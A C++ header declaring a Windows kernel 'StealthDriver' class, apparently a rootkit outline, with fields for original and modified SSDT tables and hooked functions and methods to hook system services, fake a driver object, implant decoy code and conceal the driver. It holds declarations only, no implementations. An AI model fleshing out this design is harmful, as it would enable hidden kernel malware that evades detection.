#pragma once
#include "HypervisorSecurity.h"
#include <ntdef.h>
#include <ntstatus.h>

class StealthDriver {
private:
    struct HiddenContext {
        PVOID driverObject;
        PVOID originalSSDT;
        PVOID modifiedSSDT;
        PVOID kernelBase;
        std::vector<PVOID> hookedFunctions;
    };

    HiddenContext ctx;
    HypervisorSecurity hvSecurity;

    bool ModifyKernelStructures();
    bool HookSystemServices();
    bool CreateFakeDriverObject();
    bool ImplantDecoyCode();
    
public:
    bool InitializeStealth();
    bool ConcealDriver();
    bool ProtectMemoryRegions();
    bool MonitorSystemCalls();
}; 